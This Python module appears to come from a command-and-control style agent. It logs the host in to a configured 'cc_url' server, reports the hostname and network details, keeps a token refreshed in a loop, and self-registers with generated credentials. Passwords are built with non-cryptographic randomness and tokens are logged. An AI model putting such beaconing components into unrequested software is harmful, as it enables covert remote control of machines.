#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import datetime, socket
from time import sleep
from random import randint
from hashlib import sha256

from app.components import logger, config, machine
from app.modules import http_client


class Token:
    def __init__(self):
        self.jwt = ""
        self.error = None
        self.expiration_time = None

    def login(self):
        login_url = config.credentials['cc_url'] + '/login.php'
        machine.get_hostname()
        data = {
            'username': config.credentials['username'],
            'pswd': config.credentials['pswd'],
            'hostname': machine.info['hostname']
        }

        logger.log('trying to login', 'INFO')
        response = http_client.post_json(login_url, data)
        if response and 'jwt' in response:
            self.jwt = response['jwt']
            self.expiration_time = datetime.datetime.now() + datetime.timedelta(minutes=10)
            logger.log('succesful login'.format(self.jwt), 'SUCCESS')
            logger.log('jwt: {}'.format(self.jwt), 'DEBUG')
            return self.jwt
        elif response and 'failed' in response['message']:
            self.create_user()
            return False

    def keep_logged_in(self):
        # refresh jwt token when is expired
        while True:
            if (not self.jwt) or (self.expiration_time <= datetime.datetime.now()):
                logger.log('refreshing token...', 'DEBUG')
                machine.refresh_local_net_info()
                try:
                    machine.refresh_public_net_info()
                    self.login()
                # if no internet connection, sleep until retry login
                except socket.error:
                    logger.log('connection error, sleep for {} seconds'.format(config.read_setting('inet_unreach_retry')), 'ERROR')
                    sleep(config.read_setting('inet_unreach_retry'))
                    continue
            # sleep until recheck token
            sleep(config.read_setting('token_check_retry'))

    def generate_username(self):
        if not (machine.info['private_ip'] or machine.info['hostname']):
            machine.refresh_local_net_info()
        string = (
                machine.info['private_ip'] + machine.info['hostname'] +
                (datetime.datetime.now() - datetime.timedelta(hours=randint(1,100))).strftime("%m/%d/%Y, %H:%M:%S")
        )
        username = sha256(bytes(string, 'utf-8')).hexdigest()
        return username

    def generate_password(self):
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!¡@#ç|'
        pswd_len = randint(24,32)
        password = ''
        for i in range(0, pswd_len):
            password += charset[randint(0, len(charset)-1)]
        return password

    def create_user(self):
        data = {
            'username': self.generate_username(),
            'pswd': self.generate_password()
        }
        url = config.credentials['cc_url'] + '/create_user.php'
        logger.log('trying to create user', 'WARNING')
        response = http_client.post_json(url, data)
        if response:
            logger.log('user created', 'SUCCESS')
            config.credentials['username'] = data['username']
            config.credentials['pswd'] = data['pswd']
            logger.log('writing new credentials to file', 'DEBUG')
            config.write_credentials()
            return True